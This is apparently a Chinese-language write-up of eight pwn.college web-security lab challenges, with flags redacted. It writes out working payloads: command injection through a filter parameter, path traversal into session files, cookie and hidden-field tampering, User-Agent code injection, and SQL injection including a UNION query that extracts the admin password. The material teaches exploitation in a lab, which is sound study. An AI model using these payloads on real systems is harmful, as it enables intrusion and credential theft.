用戶名: Takodan
# 1
1. 進網站, 點擊超連結, `GET /form.html`
2. Response部分程式碼
```html
<form action method='post'>
    <input type="button" value="Verify" onclick="verify(this.form)">
</form>
<script>
    <!--
    var html_doc = document.getElementsByTagName('head').item(0);
    var js = document.createElement('script');
    js.setAttribute('language', 'javascript');
    js.setAttribute('type', 'text/javascript');
    js.setAttribute('src', "/cgi-bin/verify.js");
    html_doc.appendChild(js);
    -->
</script>
```
3. 同時自動發送, `GET /cgi-bin/verify.js`
4. Response部分程式碼
```js
function verify(form) {
	if ((form.username.value == "script") && (form.password.value == "kiddie")) {
	  alert("You got it! The secret is: pwn.college{...}");
        } else {
          alert("Wrong password!");
        }
}
```


# 2
1. 進網站, 點擊超連結, `GET /users.html`
2. 
```html
<script language="JavaScript">
  var http_request = false;

  function getusers() {
    if (window.XMLHttpRequest) { // non IE
      http_request = new XMLHttpRequest(); 
    } 
    else if (window.ActiveXObject) { //
      try { 
        http_request = new ActiveXObject("Microsoft.XMLHTTP"); 
      } 
      catch (error) {}
    } 
    if (!http_request) {
      alert('Cannot create XML HTTP instance');
      return false;
    }
  
    http_request.onreadystatechange = stateManager;
    var myurl = "/cgi-bin/users.php";
    var f = document.getElementById("filter");
    if (f != null) {
      if (f.value != '') {
        myurl = myurl + "?filter=" +  f.value;
      }
    }
    /* alert(myurl); */
    http_request.open("GET", myurl, true);
    http_request.send(null);

    /* setTimeout("getusers()", 5000);  */
  }  

  function stateManager() {
    if (http_request.readyState == 4) {
      if (http_request.status == 200) {
        updatepage(http_request.responseText); 
      } else {
        alert('There was a problem with the request.');
      }
    }
  }

  function updatepage(str) {
    document.getElementById("userlist").innerHTML = str;
  } 

  setTimeout("getusers()", 5000); 
</script>
```
3. 等待一下會自動發送, `GET /cgi-bin/users.php`
4. 攔截請求, 在`users.php`後面加上查詢參數`?filter=;ls`
5. 回應`<pre>secretuser.txt\nusers.php</pre>`
6. 頁面的`<div id="userlist">`的文字被改成`<pre>secretuser.txt\nusers.php</pre>`
7. 攔截請求, 在`users.php`後面加上查詢參數`?filter=;cat+secretuser.txt`
8. 回應`<pre>pwn.college{...}</pre>`


# 3
1. 進網站, Response部分程式碼
```html
<form action="/cgi-bin/petition.py" method="get">
<table>
    <tbody>
        <tr>
            <td>First:</td>
            <td><input type="text" name="first"></td>
        </tr>
        <tr>
            <td>Last:</td>
            <td><input type="text" name="last"></td>
        </tr>
        <tr>
            <td>Email:</td>
            <td><input type="text" name="email"></td>
        </tr>
        <tr>
            <td>Comment:</td>
            <td>
                <textarea rows="2" columns="20" name="comment">
                    Remove cp from UNIX now!
                </textarea>
            </td>
        </tr>
        <tr>
            <td>ID:</td>
            <td><input type="text" name="id"></td>
        </tr>
        <tr>
            <td></td>
            <td><input type="submit" value="Sign the petition"
            ></td>
        </tr>
    </tbody>
</table>
</form>
```
2. 填寫form後submit
    - `GET /cgi-bin/petition.py?first=F&last=W&email=fishw%40asu.edu&comment=wah&id=`
3. 回傳包含一組字串`Your ID is 43b4ea99e7dd48b687d772288fad1d00`
4. 回到一開始頁面, 輸入id後submit
    - `GET /cgi-bin/petition.py?first=&last=&email=&comment=&id=43b4ea99e7dd48b687d772288fad1d00`
5. 回傳包含一組字串`Your comment was: pwn.college{..}`


# 4
1. 進網站, Response部分程式碼
```html
<form action="/cgi-bin/it.php" method="post">
    <p>Enter your name: <input type="text" name="username"></p>
    <p>Enter your password: <input type="password" name="password"></p>
    <p><input type="submit" value="Start"></p>
</form>
```
2. 點擊表單`Start`(`submit`)發送
    1. 頭: `POST /cgi-bin/it.php`
    2. 主體: `username=&password=`
3. Response
    1. 頭包含Set-Cookie: `Set-Cookie: PHPSESSID=80s78pl63c16hj3mb8c2v1g8c5; path=/`
    2. 主體包含input hidden:
    ```html
    <p>Welcome </p>
    <form action="/cgi-bin/it.php" method="post">
        <p>File: <input type="text" name="filename" /></p>
        <p>Data: <input type="text" name="data" /></p>
        <p><input type="submit" value="Submit"></p>
        <p><input type="hidden" name="nonce" value="635379058" /></p>
    </form>
    ```
4. 點擊表單`Submit`發送
    1. 頭: `POST /cgi-bin/it.php`, `Cookie: PHPSESSID=80s78pl63c16hj3mb8c2v1g8c5`
    2. 主體: `filename=&data=&nonce=635379058`
5. Response主體
```html
<form action="/cgi-bin/it.php" method="post">
    <p><input type="text" name="filename"></p>
    <p><input type="hidden" name="readmode" value="yes"></p>
    <p><input type="submit" value="Read"></p>
    <p><input type="hidden" name="nonce" value="635379058"></p>
</form>
```
6. 輸入`../`點擊`Read`發送
    1. 頭: `POST /cgi-bin/it.php`
    2. 主體:`filename=..%2&readmode=yes&nonce=635379058`
7. 得到Response主體`.config<br>public_html<br>session<br>storage<br>`
8. 返回上一頁, 重新整理, 會發送和步驟4相同請求, 得到步驟5Response主體
9. 輸入`../session`點擊`Read`發送, 得到Response主體`sess_91c7e1e10744d69fd8fe35ecfc<br>`
10. 重複步驟8步驟9, 輸入`../session/sess_91c7e1e10744d69fd8fe35ecfc`
11. 得到Response主體
```html
"username|s:4:"fish";password|s:32:"pwn.college{...}";nonce|i:893397759;last_filename|s:8:"c7be0c38""
```

# 5
1. 進入頁面, 兩個from都有隱藏input, name=admin value='0'
2. 根據提示嘗試
3. `POST /cgi-bin/store`給`Cookie:blacklist=store`和`admin=1`可以得到`store`程式碼
4. `POST /cgi-bin/store`給`Cookie:blacklist=retrieve`和`admin=1`可以得到`retrieve`程式碼
5. 閱讀程式碼, 得到`POST /cgi-bin/retrieve`所需要的`Cookie`鍵值有`site`和`password`
6. 閱讀程式碼, 得到`password`的值
7. `POST /cgi-bin/retrieve`給`Cookie:site=www.bank.com;password=terriblechoice`和`admin=1`
8. 得到儲存的密碼內容`www.bank.com:fish:pwn.college{...}`

# 6
1. 創立一個本地php文件, 裡面包含`system()`
2. `User-Agent`值作為注入, 運行本地php文件
3. 藉由修改本地php文件`system()`的參數遍歷檔案
4. 找到`/challenge/public_html/cgi-bin/s3cr37.pwd`輸出文字

# 7
1. query 格式`SELECT * FROM users WHERE username='" . $username . "'`
2. `1' or '1=1`, WHERE 會永遠為True, 程式碼會print 所有的username, firstname, lastname
3. `admin' UNION SELECT password, NULL, NULL, NULL, NULL, NULL FROM users WHERE username='admin`
4. 合併`WHERE username='admin`和`WHERE username='admin`的結果
5. 程式碼照常print username, 但是第二個結果的username 列被替換成password列, 程式碼會print出password


# 8
1. User輸入admin, Password輸入admin, 請求`GET /2factor.php`
2. Submit, 請求`POST /2factor.php`, Response包含一段Base64字串
3. 解碼Base64字串得到`pwn.college{...}`
    